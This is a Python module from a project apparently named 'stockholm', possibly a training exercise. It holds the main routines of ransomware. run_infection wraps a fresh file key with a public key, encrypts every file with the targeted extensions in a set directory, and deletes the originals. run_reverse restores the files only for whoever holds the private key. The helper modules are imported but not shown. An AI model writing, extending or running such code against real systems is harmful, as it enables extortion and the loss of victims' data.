
import os, sys
import logging

from pathlib import Path
from stockholm.config import ENCRYPTED_EXTENSION, INFECTED_EXTENSIONS, INFECTED_PATH, PUBLIC_KEY_PATH
from stockholm.handler.file_management import find_files
from stockholm.handler.key_management import load_wrapping_public_key
from stockholm.handler.key_management import store_encrypted_key
from stockholm.handler.key_management import create_file_encryption_key
from stockholm.handler.key_management import encrypt_key
from stockholm.handler.encryption import encrypt_file
from stockholm.handler.key_management import load_wrapping_private_key
from stockholm.handler.key_management import retrieve_encrypted_key
from stockholm.handler.key_management import decrypt_key
from stockholm.handler.decryption import decrypt_file


# ===============================================================================
#  Run the file infection/encryption process.
#
#  @return: None.
# ===============================================================================
def run_infection() -> None :
    logger      = logging.getLogger(__name__)

    try:
        public_key      = load_wrapping_public_key(PUBLIC_KEY_PATH)
        logger.info("wrapping public key loaded successfully :)")

        encryption_key  = create_file_encryption_key()
        encrypted_key   = encrypt_key(public_key, encryption_key)

        files, Warning  = find_files(Path(INFECTED_PATH), INFECTED_EXTENSIONS)
        for message in Warning:
            logger.warning(message)        

        for file_path in files:
            try:
                logger.info("Processing file: %s", file_path)
                output_path = encrypt_file(file_path, encryption_key)
                store_encrypted_key(output_path, encrypted_key)
                file_path.unlink(missing_ok=True)
                logger.info("Successfully processed: %s -> %s", file_path, output_path)

            except PermissionError as exc:
                logger.warning(
                    f"Permission denied while processing '{file_path}': {exc}"
                )

            except OSError as exc:
                logger.warning(
                    f"Filesystem error while processing '{file_path}': {exc}"
                )

            except Exception as exc:
                logger.error(
                    f"Unexpected error while processing '{file_path}': {exc}"
                )

        logger.info(f"Infection process done: %s", INFECTED_PATH)


    except (OSError, ValueError, TypeError) as error:
        logger.error("Infection process failed: %s", error)
        sys.exit(os.EX_SOFTWARE)


# ===============================================================================
#  Run the file decryption process.
#
#  @param private_key_path: Path to the wrapping private key.
#  @return: None.
# ===============================================================================
def run_reverse(private_key_path: str) -> None :
    logger      = logging.getLogger(__name__)

    try:
        private_key = load_wrapping_private_key(private_key_path)
        logger.info("wrapping private key loaded successfully :)")

        files, Warning  = find_files(Path(INFECTED_PATH), [ENCRYPTED_EXTENSION])
        for message in Warning:
            logger.warning(message)        

        for file_path in files:
            try:
                logger.info("Processing file: %s", file_path)
                encrypted_key  = retrieve_encrypted_key(file_path)
                file_key       = decrypt_key(private_key, encrypted_key)
                output_path    = decrypt_file(file_path, file_key)
                file_path.unlink(missing_ok=True)
                logger.info("Successfully processed: %s -> %s", file_path, output_path)

            except PermissionError as exc:
                logger.warning(
                    f"Permission denied while processing '{file_path}': {exc}"
                )
            except OSError as exc:
                logger.warning(
                    f"Filesystem error while processing '{file_path}': {exc}"
                )
            except Exception as exc:
                logger.error(
                    f"Unexpected error while processing '{file_path}': {exc}"
                )

    except (OSError, ValueError, TypeError) as error:
        logger.error("Reverse process failed: %s", error)
        sys.exit(os.EX_SOFTWARE)
